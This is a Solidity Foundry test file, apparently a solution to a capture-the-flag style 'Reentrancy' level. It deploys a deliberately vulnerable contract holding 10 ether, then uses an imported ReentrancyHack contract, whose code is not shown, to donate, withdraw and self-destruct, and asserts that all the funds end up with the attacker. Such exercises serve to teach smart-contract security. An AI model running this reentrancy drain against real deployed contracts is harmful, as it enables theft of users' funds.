// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Reentrancy/Level.sol";
import "../utils/ReentrancyHack.sol";
import "forge-std/console.sol";

interface IReentrancyHack {
    function donate() external payable;

    function killMe(address _to) external;

    function withdraw(uint _amount) external;
}

contract ReentrancyTest is Test {
    IReentrance reentrance;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        vm.deal(deployer, 11 ether);
        reentrance = IReentrance(address(new Reentrance()));
        reentrance.donate.value(10 ether)(deployer);
        assert(address(reentrance).balance == 10 ether);
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        IReentrancyHack reentrancyHack = IReentrancyHack(address(new ReentrancyHack(address(reentrance))));
        reentrancyHack.donate.value(1 ether)();
        reentrancyHack.withdraw(1 ether);
        reentrancyHack.killMe(attacker);
        /* Write your code here */ 

        /* Validating the test */
        assertEq(address(reentrance).balance, 0);
        assertGe(attacker.balance, 10 ether);
    }
}

